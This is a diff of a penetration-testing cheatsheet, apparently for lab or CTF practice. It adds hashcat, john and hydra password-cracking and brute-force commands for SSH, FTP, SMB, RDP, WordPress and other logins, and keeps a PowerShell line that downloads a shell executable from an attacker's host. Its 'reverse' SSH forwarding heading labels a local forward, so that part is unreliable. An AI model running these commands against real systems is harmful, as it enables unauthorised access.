@@ -15,13 +15,34 @@ $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/nul
 powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
 powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
 ```
-# Hashcat
-```console
-hashcat -m <op> -a 0 -o crack.txt 'hash' /usr/share/wordlists/rockyou.txt --force
-```
 # gobuster
 ```console
-gobuster dir -u http://<ip>/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
+$ gobuster dir -u http://$IP/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
+```
+# Password atk
+## Hashcat
+```console
+$ hashcat -m <op> -a 0 -o crack.txt 'hash' /usr/share/wordlists/rockyou.txt --force
+```
+## john
+```console
+root@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt <hash>
+```
+## hydra
+credit noxtal cheatsheet, check [here](https://noxtal.com/cheatsheets/2020/07/24/hydra-cheatsheet/)
+```console
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
+$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' #wordpress
+$ hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
+$ hydra -t 64 -l username -P /usr/share/wordlists/rockyou.txt pop3://$IP #pop3
+```
+# Reverse SSH port forwarding
+```console
+$ ssh -L <LPORT>:<RHOST>:<RPROT> <username>@$IP
 ```
 # curl
 ```console
